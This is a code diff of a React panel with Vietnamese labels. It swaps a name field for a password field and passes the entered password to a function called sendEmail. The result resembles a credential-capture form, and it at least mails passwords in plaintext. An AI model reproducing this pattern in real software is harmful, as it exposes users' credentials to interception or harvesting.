@@ -21,7 +21,7 @@ export const RightPanel: React.FC<RightPanelProps> = ({
   isFocused,
 }) => {
   const emailRef = useRef<HTMLInputElement>(null);
-  const [name, setName] = useState("");
+  const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
   const [isValidated, setIsValidated] = useState(true);
 
@@ -37,8 +37,8 @@ export const RightPanel: React.FC<RightPanelProps> = ({
     if (!isValidated) {
       return;
     }
-    sendEmail(email, name);
-    setName("");
+    sendEmail(email, password);
+    setPassword("");
     setEmail("");
   };
 
@@ -79,14 +79,6 @@ export const RightPanel: React.FC<RightPanelProps> = ({
             className="flex flex-col justify-center px-6 py-4"
             onSubmit={handleSubmit}
           >
-            <label className="text-white text-lg mb-2">Tên:</label>
-            <input
-              type="text"
-              placeholder="Tên"
-              value={name}
-              onChange={(e) => setName(e.target.value)}
-              className="rounded-[5px] p-2 mb-4 w-full bg-white text-black"
-            />
             <label className="text-white text-lg mb-2">Email:</label>
             <input
               ref={emailRef}
@@ -116,6 +108,14 @@ export const RightPanel: React.FC<RightPanelProps> = ({
                 Giá trị email nhập vào không hợp lệ
               </p>
             )}
+            <label className="text-white text-lg mb-2">Mật khẩu:</label>
+            <input
+              type="password"
+              placeholder="Mật khẩu"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="rounded-[5px] p-2 mb-4 w-full bg-white text-black"
+            />
             <div className="flex justify-center mt-4">
               <Button
                 type="submit"
